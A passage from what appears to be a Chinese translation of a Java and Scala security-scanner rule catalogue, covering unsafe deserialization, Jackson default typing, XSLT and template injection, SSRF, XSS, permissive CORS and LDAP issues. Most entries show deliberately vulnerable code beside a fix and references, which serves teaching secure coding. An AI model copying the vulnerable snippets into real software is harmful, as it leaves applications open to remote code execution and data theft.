&lt;secure&gt;true&lt;/secure&gt;</span><br><span class="line"> &lt;/cookie-config&gt;</span><br><span class="line">&lt;/session-config&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://blog.codinghorror.com/protecting-your-cookies-httponly/" target="_blank" rel="noopener">Coding Horror blog: Protecting Your Cookies: HttpOnly</a><br><a href="https://www.owasp.org/index.php/HttpOnly" target="_blank" rel="noopener">OWASP: HttpOnly</a><br><a href="https://www.rapid7.com/db/vulnerabilities/http-cookie-http-only-flag" target="_blank" rel="noopener">Rapid7: Missing HttpOnly Flag From Cookie</a></p><h1 id="使用反序列化对象"><a href="#使用反序列化对象" class="headerlink" title="使用反序列化对象"></a>使用反序列化对象</h1><p>漏洞特征：OBJECT_DESERIALIZATION<br>反序列化不受信任的数据可能会导致远程命令执行，如果有可用的执行链，那么就会触发恶意操作。库的开发者在逐渐提高防御策略，以避免潜在的恶意利用。但是还是有一些已知的类可以触发dos攻击。<br>反序列化是一个敏感的操作，因为历史上曾经有很多比较有名的漏洞都是出自它。web应用是很脆弱的，因为很快java虚拟机里面将会爆发出一波新的漏洞。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    try (ObjectInputStream in = new ObjectInputStream(receivedFile)) &#123;</span><br><span class="line">        return (UserData) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免反序列从远程用户输入的数据<br>引用：<br><a href="https://cwe.mitre.org/data/definitions/502.html" target="_blank" rel="noopener">CWE-502: Deserialization of Untrusted Data</a><br><a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data" target="_blank" rel="noopener">Deserialization of untrusted data</a><br><a href="http://www.oracle.com/technetwork/java/seccodeguide-139067.html#8" target="_blank" rel="noopener">Serialization and Deserialization</a><br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">A tool for generating payloads that exploit unsafe Java object deserialization</a><br>[1] <a href="https://gist.github.com/coekie/a27cc406fc9f3dc7a70d" target="_blank" rel="noopener">Example of Denial of Service using the class java.util.HashSet</a><br>[2] <a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-2590" target="_blank" rel="noopener">OpenJDK: Deserialization issue in ObjectInputStream.readSerialData() (CVE-2015-2590)</a><br>[3] <a href="https://www.rapid7.com/db/modules/exploit/multi/browser/java_calendar_deserialize" target="_blank" rel="noopener">Rapid7: Sun Java Calendar Deserialization Privilege Escalation (CVE-2008-5353)</a></p><h1 id="不安全的Jackson发序列化配置"><a href="#不安全的Jackson发序列化配置" class="headerlink" title="不安全的Jackson发序列化配置"></a>不安全的Jackson发序列化配置</h1><p>漏洞特征：JACKSON_UNSAFE_DESERIALIZATION<br>如果Jackson databind库被用来反序列不受信任的数据的话，就会导致远程命令执行。如果有可用的执行链，那么就会触发恶意操作。<br>解决方案：<br>当通过JsonTypeInfo.Id.NAME使用多态性时，应该明确定义想要的类型和子类型。并且不要调用ObjectMapper.enableDefaultTyping（readValue包含Object 或 Serializable 或 Comparable 或 已知的反序列化类型）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class Example &#123;</span><br><span class="line">    static class ABean &#123;</span><br><span class="line">        public int id;</span><br><span class="line">        public Object obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static class AnotherBean &#123;</span><br><span class="line">        @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) // or JsonTypeInfo.Id.MINIMAL_CLASS</span><br><span class="line">        public Object obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void example(String json) throws JsonMappingException &#123;</span><br><span class="line">         ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">         mapper.enableDefaultTyping();</span><br><span class="line">         mapper.readValue(json, ABean.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void exampleTwo(String json) throws JsonMappingException &#123;</span><br><span class="line">         ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">         mapper.readValue(json, AnotherBean.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://github.com/FasterXML/jackson-databind/issues/1599" target="_blank" rel="noopener">Jackson Deserializer security vulnerability</a><br><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">Java Unmarshaller Security - Turning your data into code execution</a></p><h1 id="在反序列化漏洞中被利用的类"><a href="#在反序列化漏洞中被利用的类" class="headerlink" title="在反序列化漏洞中被利用的类"></a>在反序列化漏洞中被利用的类</h1><p>漏洞特征：DESERIALIZATION_GADGET<br>反序列化利用链是一些可以被攻击者利用的类，这些类通常存在于远程api中。这些类也会被添自定义行为，目的是用readObject方法去反序列化 (Serializable)或者调用来自序列化对象中的方法(InvocationHandler).<br>这个检查工具主要用于研究人员。真实的场景是反序列化会被用于远程操作。为了减少恶意代码的利用，必须要强制移除利用链中所使用的类。<br>引用：<br><a href="https://cwe.mitre.org/data/definitions/502.html" target="_blank" rel="noopener">CWE-502: Deserialization of Untrusted Data</a><br><a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data" target="_blank" rel="noopener">Deserialization of untrusted data</a><br><a href="http://www.oracle.com/technetwork/java/seccodeguide-139067.html#8" target="_blank" rel="noopener">Serialization and Deserialization</a><br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">A tool for generating payloads that exploit unsafe Java object deserialization</a><br>[1] <a href="https://gist.github.com/coekie/a27cc406fc9f3dc7a70d" target="_blank" rel="noopener">Example of Denial of Service using the class java.util.HashSet</a><br>[2] <a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-2590" target="_blank" rel="noopener">OpenJDK: Deserialization issue in ObjectInputStream.readSerialData() (CVE-2015-2590)</a><br>[3] <a href="https://www.rapid7.com/db/modules/exploit/multi/browser/java_calendar_deserialize" target="_blank" rel="noopener">Rapid7: Sun Java Calendar Deserialization Privilege Escalation (CVE-2008-5353)</a></p><h1 id="违反信任边界"><a href="#违反信任边界" class="headerlink" title="违反信任边界"></a>违反信任边界</h1><p>漏洞特征：TRUST_BOUNDARY_VIOLATION<br>信任边界被认为是通过程序画的一根线。在线的一边，数据是不可信的。在线的另一边，数据是被可信任的。身份效验的目的是为了数据能够安全的通过信任边界-从不信任的一遍到信任的一边。当程序模糊了信任数据和不信任数据的边界时就会导致违反信任边界的事情发生。把信任数据和不信任数据组合成相同的数据结构时，就会让程序员更容易在边界上的犯错。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void doSomething(HttpServletRequest req, String activateProperty) &#123;</span><br><span class="line">    //..</span><br><span class="line"></span><br><span class="line">    req.getSession().setAttribute(activateProperty,&quot;true&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">123456</span><br><span class="line">public void loginEvent(HttpServletRequest req, String userSubmitted) &#123;</span><br><span class="line">    //..</span><br><span class="line"></span><br><span class="line">    req.getSession().setAttribute(&quot;user&quot;,userSubmitted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：<br>解决方案是在设置新的session属性前要添加验证。如果有可能，最好数据是来自安全的地方而不是用户提供的输入数据<br>引用：<br>[1] <a href="https://cwe.mitre.org/data/definitions/501.html" target="_blank" rel="noopener">CWE-501: Trust Boundary Violation</a><br><a href="https://www.owasp.org/index.php/Trust_Boundary_Violation" target="_blank" rel="noopener">OWASP : Trust Boundary Violation</a></p><h1 id="恶意的XSLT"><a href="#恶意的XSLT" class="headerlink" title="恶意的XSLT"></a>恶意的XSLT</h1><p>漏洞特征：JSP_XSLT<br>XSLT(可扩展样式表转换语言)是一种用于将XML 文档转换为其他XML 文档的语言。<br>xslt的样式表中可能会携带恶意的行为。所以，如果一个攻击者控制了源样式表的内容，那么它可能会触发远程代码执行<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;x:transform xml=&quot;$&#123;xmlData&#125;&quot; xslt=&quot;$&#123;xsltControlledByUser&#125;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>解决方案：<br>解决方案确保源样式表来自安全的源，并且保证不会有类似于路径穿透的漏洞。<br>引用<br>[1] <a href="https://en.wikipedia.org/wiki/XSLT" target="_blank" rel="noopener">Wikipedia: XSLT (Extensible Stylesheet Language Transformations)</a><br><a href="https://prezi.com/y_fuybfudgnd/offensive-xslt/" target="_blank" rel="noopener">Offensive XSLT</a> by Nicolas Gregoire<br>[2] <a href="http://www.agarri.fr/kom/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html" target="_blank" rel="noopener">From XSLT code execution to Meterpreter shells</a> by Nicolas Gregoire<br><a href="http://xhe.myxwiki.org/xwiki/bin/view/Main/" target="_blank" rel="noopener">XSLT Hacking Encyclopedia</a> by Nicolas Gregoire<br><a href="http://www.acunetix.com/blog/articles/the-hidden-dangers-of-xsltprocessor-remote-xsl-injection/" target="_blank" rel="noopener">Acunetix.com : The hidden dangers of XSLTProcessor - Remote XSL injection</a><br><a href="https://www.w3.org/TR/xslt" target="_blank" rel="noopener">w3.org XSL Transformations (XSLT) Version 1.0</a> : w3c specification<br>[3] [WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br>[4] <a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a></p><h1 id="恶意的XSLT-1"><a href="#恶意的XSLT-1" class="headerlink" title="恶意的XSLT"></a>恶意的XSLT</h1><p>漏洞特征：MALICIOUS_XSLT<br>XSLT(可扩展样式表转换语言)是一种用于将XML 文档转换为其他XML 文档的语言。<br>xslt的样式表中可能会携带恶意的行为。所以，如果一个攻击者控制了源样式表的内容，那么它可能会触发远程代码执行<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Source xslt = new StreamSource(new FileInputStream(inputUserFile)); //Dangerous source to validate</span><br><span class="line"></span><br><span class="line">Transformer transformer = TransformerFactory.newInstance().newTransformer(xslt);</span><br><span class="line"></span><br><span class="line">Source text = new StreamSource(new FileInputStream(&quot;/data_2_process.xml&quot;));</span><br><span class="line">transformer.transform(text, new StreamResult(...));</span><br></pre></td></tr></table></figure><p>解决方案：<br>解决方案确保源样式表来自安全的源，并且保证不会有类似于路径穿透的漏洞。<br>引用<br>[1] <a href="https://en.wikipedia.org/wiki/XSLT" target="_blank" rel="noopener">Wikipedia: XSLT (Extensible Stylesheet Language Transformations)</a><br><a href="https://prezi.com/y_fuybfudgnd/offensive-xslt/" target="_blank" rel="noopener">Offensive XSLT</a> by Nicolas Gregoire<br>[2] <a href="http://www.agarri.fr/kom/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html" target="_blank" rel="noopener">From XSLT code execution to Meterpreter shells</a> by Nicolas Gregoire<br><a href="http://xhe.myxwiki.org/xwiki/bin/view/Main/" target="_blank" rel="noopener">XSLT Hacking Encyclopedia</a> by Nicolas Gregoire<br><a href="http://www.acunetix.com/blog/articles/the-hidden-dangers-of-xsltprocessor-remote-xsl-injection/" target="_blank" rel="noopener">Acunetix.com : The hidden dangers of XSLTProcessor - Remote XSL injection</a><br><a href="https://www.w3.org/TR/xslt" target="_blank" rel="noopener">w3.org XSL Transformations (XSLT) Version 1.0</a> : w3c specification<br>[3] [WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br>[4] <a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a></p><h1 id="潜藏在Scala-Play中的信息泄露"><a href="#潜藏在Scala-Play中的信息泄露" class="headerlink" title="潜藏在Scala Play中的信息泄露"></a>潜藏在Scala Play中的信息泄露</h1><p>漏洞特征：SCALA_SENSITIVE_DATA_EXPOSURE<br>应用总是无意识的泄露一些配置信息，比如内部结构或者通过各种应用问题侵犯隐私。<br>基于各种有效的输入数据页面会返回不同的返回数据，尤其当机密数据被当成结果被web应用展示出来的时候，就会导致信息的泄露。<br>敏感数据包括（不仅仅是列出来的这些）：api密钥，密码，产品版本，环境配置。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def doGet(value:String) = Action &#123;</span><br><span class="line">  val configElement = configuration.underlying.getString(value)</span><br><span class="line"></span><br><span class="line">  Ok(&quot;Hello &quot;+ configElement +&quot; !&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用配置的关键部分不应该被输出到返回数据报文中，并且用户也不能操作那些被用于代码的关键配置。<br>引用：<br><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" target="_blank" rel="noopener">OWASP: Top 10 2013-A6-Sensitive Data Exposure</a><br>[1] <a href="https://www.owasp.org/index.php/Top_10_2007-Information_Leakage_and_Improper_Error_Handling" target="_blank" rel="noopener">OWASP: Top 10 2007-Information Leakage and Improper Error Handling</a><br>[2] [WASC-13: Information Leakage](<a href="http://projects.webappsec.org/w/page/13246936/Information" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246936/Information</a> Leakage)<br><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank" rel="noopener">CWE-200: Information Exposure</a></p><h1 id="Scala-Play服务器端请求伪造-SSRF"><a href="#Scala-Play服务器端请求伪造-SSRF" class="headerlink" title="Scala Play服务器端请求伪造(SSRF)"></a>Scala Play服务器端请求伪造(SSRF)</h1><p>漏洞特征：SCALA_PLAY_SSRF<br>当服务器端发送一个请求，这个请求的目标地址是用户输入指定的，且这个请求没有被严格的效验时，就会发生服务器端请求伪造漏洞。这个漏洞允许攻击者用你的web服务器访问网络上的任何一台服务器或者攻击其他服务器。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def doGet(value:String) = Action &#123;</span><br><span class="line">    WS.url(value).get().map &#123; response =&gt;</span><br><span class="line">        Ok(response.body)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要让用户控制请求的目的地址</li><li>接受一个目的地址的key，使用这个key去查找合法的目的地址</li><li>urls地址白名单（如果可能的话）</li><li>用白名单校验url地址开头的部分</li></ul><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/918.html" target="_blank" rel="noopener">CWE-918: Server-Side Request Forgery (SSRF)</a><br><a href="https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/" target="_blank" rel="noopener">Understanding Server-Side Request Forgery</a></p><h1 id="URLConnection中的服务器端请求伪造-SSRF-和任意文件访问"><a href="#URLConnection中的服务器端请求伪造-SSRF-和任意文件访问" class="headerlink" title="URLConnection中的服务器端请求伪造(SSRF) 和任意文件访问"></a>URLConnection中的服务器端请求伪造(SSRF) 和任意文件访问</h1><p>漏洞特征：SCALA_PLAY_SSRF<br>当服务器端发送一个请求，这个请求的目标地址是用户输入指定的，且这个请求没有被严格的效验时，就会发生服务器端请求伪造漏洞。这个漏洞允许攻击者用你的web服务器访问网络上的任何一台服务器或者攻击其他服务器。<br>URLConnection能够使用file://协议获取其他的协议去访问本地的文件系统和其他的服务<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new URL(String url).openConnection()</span><br><span class="line">new URL(String url).openStream()</span><br><span class="line">new URL(String url).getContent()</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要让用户控制请求的目的地址</li><li>接受一个目的地址的key，使用这个key去查找合法的目的地址</li><li>urls地址白名单（如果可能的话）</li><li>用白名单校验url地址开头的部分</li></ul><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/918.html" target="_blank" rel="noopener">CWE-918: Server-Side Request Forgery (SSRF)</a><br><a href="https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/" target="_blank" rel="noopener">Understanding Server-Side Request Forgery</a><br><a href="https://cwe.mitre.org/data/definitions/73.html" target="_blank" rel="noopener">CWE-73: External Control of File Name or Path</a><br><a href="https://www.pwntester.com/blog/2013/11/28/abusing-jar-downloads/" target="_blank" rel="noopener">Abusing jar:// downloads</a></p><h1 id="在Scala-Twirl模板引擎里面潜在的xss"><a href="#在Scala-Twirl模板引擎里面潜在的xss" class="headerlink" title="在Scala Twirl模板引擎里面潜在的xss"></a>在Scala Twirl模板引擎里面潜在的xss</h1><p>漏洞规则：SCALA_XSS_TWIRL<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@(value: Html)</span><br><span class="line"></span><br><span class="line">@value</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@(value: String)</span><br><span class="line"></span><br><span class="line">@value</span><br></pre></td></tr></table></figure><p>抵御xss最好的方式是像上面在输出中编码特殊的字符。有4种环境类型要考虑：HTML, JavaScript, CSS (styles), 和URLs.请遵守OWASP XSS Prevention备忘录中定义的xss保护规则，里面会介绍一些重要的防御细节。<br>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="https://code.google.com/p/owasp-java-encoder/" target="_blank" rel="noopener">OWASP Java Encoder</a></p><h1 id="在Scala-MVC-API引擎里面潜在的xss"><a href="#在Scala-MVC-API引擎里面潜在的xss" class="headerlink" title="在Scala MVC API引擎里面潜在的xss"></a>在Scala MVC API引擎里面潜在的xss</h1><p>漏洞规则： SCALA_XSS_MVC_API<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def doGet(value:String) = Action &#123;</span><br><span class="line">    Ok(&quot;Hello &quot; + value + &quot; !&quot;).as(&quot;text/html&quot;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def doGet(value:String) = Action &#123;</span><br><span class="line">    Ok(&quot;Hello &quot; + Encode.forHtml(value) + &quot; !&quot;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>抵御xss最好的方式是像上面在输出中编码特殊的字符。有4种环境类型要考虑：HTML, JavaScript, CSS (styles), 和URLs.请遵守OWASP XSS Prevention备忘录中定义的xss保护规则，里面会介绍一些重要的防御细节。<br>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="https://code.google.com/p/owasp-java-encoder/" target="_blank" rel="noopener">OWASP Java Encoder</a></p><h1 id="在Velocity中潜在的模板注入"><a href="#在Velocity中潜在的模板注入" class="headerlink" title="在Velocity中潜在的模板注入"></a>在Velocity中潜在的模板注入</h1><p>漏洞特征：TEMPLATE_INJECTION_VELOCITY<br>Velocity模板引擎非常强大。你可以在模板中使用条件判断，循环，外部函数调用等逻辑代码。它里面也没有一个沙箱去限制操作。一个恶意的用户如果可以控制模板，那么他就可以在服务器端运行恶意代码。Velocity模板应被视为脚本。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Velocity.evaluate(context, swOut, &quot;test&quot;, userInput);</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免让终端用户操作Velocity中的模板。如果你需要让你的用户去操作模板，那么最好限制模板引擎的能力，就像Handlebars 或 Moustache 一样（见引用）<br>引用：<br><a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank" rel="noopener">PortSwigger: Server-Side Template Injection</a><br><a href="https://jknack.github.io/handlebars.java/" target="_blank" rel="noopener">Handlebars.java</a></p><h1 id="在Freemarker中潜在的模板注入"><a href="#在Freemarker中潜在的模板注入" class="headerlink" title="在Freemarker中潜在的模板注入"></a>在Freemarker中潜在的模板注入</h1><p>漏洞特征：TEMPLATE_INJECTION_FREEMARKER<br>Freemarker模板引擎非常强大。你可以在模板中使用条件判断，循环，外部函数调用等逻辑代码。它里面也没有一个沙箱去限制操作。一个恶意的用户如果可以控制模板，那么他就可以在服务器端运行恶意代码。Velocity模板应被视为脚本。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Template template = cfg.getTemplate(inputTemplate);</span><br><span class="line">[...]</span><br><span class="line">template.process(data, swOut);</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免让终端用户操作Freemarker中的模板。如果你需要让你的用户去操作模板，那么最好限制模板引擎的能力，就像Handlebars 或 Moustache 一样（见引用）<br>引用：<br><a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank" rel="noopener">PortSwigger: Server-Side Template Injection</a><br><a href="https://jknack.github.io/handlebars.java/" target="_blank" rel="noopener">Handlebars.java</a></p><h1 id="过度宽松的cors策略"><a href="#过度宽松的cors策略" class="headerlink" title="过度宽松的cors策略"></a>过度宽松的cors策略</h1><p>漏洞规则：PERMISSIVE_CORS<br>在html5之前，web浏览器强制使用同源策略，目的是保证JavaScript能够访问web页面的内容，JavaScript和web页面的起源必须来自于同一个域下。如果没有同源策略，那么恶意网站就可以用JavaScript脚本加载客户端的用户凭据，从而读取用户保存在其他网站的中敏感信息，然后把数据传送给攻击者。如果http返回头定义了Access-Control-Allow-Origin字段，那么就可以让JavaScript跨域访问数据。有了这个头，web服务器就可以定义哪些其他域可以跨域来访问这个服务器。可是应该小心定义这个头，因为过度宽松的cors策略可以让恶意的应用通过这样的方式去读取受害者应用中的敏感数据，这样就会导致欺骗，数据失窃，数据修改等其他的攻击行为。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.addHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免在Access-Control-Allow-Origin这个头中使用*，这表示运行在其他域下的任何JavaScript都可以访问这个域下的应用数据<br>引用：<br><a href="https://www.w3.org/TR/cors/" target="_blank" rel="noopener">W3C Cross-Origin Resource Sharing</a><br><a href="http://enable-cors.org/" target="_blank" rel="noopener">Enable Cross-Origin Resource Sharing</a></p><h1 id="匿名的LDAP绑定"><a href="#匿名的LDAP绑定" class="headerlink" title="匿名的LDAP绑定"></a>匿名的LDAP绑定</h1><p>漏洞特征：LDAP_ANONYMOUS<br>没有做合适的访问控制，攻击者可以滥用ldap配置，让ldap服务器执行一段包含用户控制的代码。所有依赖ctx的ldap查询都可以以不需要用户认证和访问控制的方式去执行。攻击者可以操作其中的查询语句来获取被directory服务器保护的数据。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">env.put(Context.SECURITY_AUTHENTICATION, &quot;none&quot;);</span><br><span class="line">DirContext ctx = new InitialDirContext(env);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>解决方案：<br>考虑ldap中其他的用户认证模式并且确保有合适的访问控制</p><p>引用：<br><a href="https://docs.oracle.com/javase/tutorial/jndi/ldap/auth_mechs.html" target="_blank" rel="noopener">Ldap Authentication Mechanisms</a></p><h1 id="ldap-入口投毒"><a href="#ldap-入口投毒" class="headerlink" title="ldap 入口投毒"></a>ldap 入口投毒</h1><p>漏洞特征： LDAP_ENTRY_POISONING<br>JNDI api支持在ldap目录上绑定序列化对象。如果提供确定的属性，反序列化对象将会被用于应用数据的查询（详细信息见Black Hat USA 2016 白皮书）。反序列化对象是一个有风险的操作，他可能会导致远程代码执行。<br>如果攻击者获得ldap基本查询的入口点，那么这个漏洞就可能会被利用。通过添加一个属性给已存在的ldap入口或者通过配置应用，就可以恶意的使用ldap服务器了。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DirContext ctx = new InitialDirContext();</span><br><span class="line">//[...]</span><br><span class="line"></span><br><span class="line">ctx.search(query, filter,</span><br><span class="line">        new SearchControls(scope, countLimit, timeLimit, attributes,</span><br><span class="line">            true, //Enable object deserialization if bound in directory</span><br><span class="line">            deref));</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DirContext ctx = new InitialDirContext();</span><br><span class="line">//[...]</span><br><span class="line"></span><br><span class="line">ctx.search(query, filter,</span><br><span class="line">        new SearchControls(scope, countLimit, timeLimit, attributes,</span><br><span class="line">            false, //Disable</span><br><span class="line">            deref));</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">Black Hat USA 2016: A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land (slides &amp; video) by Alvaro Muñoz and Oleksandr Mirosh</a></p><p><a href="https://community.hpe.com/t5/Security-Research/Introducing-JNDI-Injection-and-LDAP-Entry-Poisoning/ba-p/6885118" target="_blank" rel="noopener">HP Enterprise: Introducing JNDI Injection and LDAP Entry Poisoning by Alvaro Muñoz</a></p><p><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/" target="_blank" rel="noopener">TrendMicro: How The Pawn Storm Zero-Day Evaded Java’s Click-to-Play Protection by Jack Tang</a></p><h1 id="使用持久性的cookie"><a href="#使用持久性的cookie" class="headerlink" 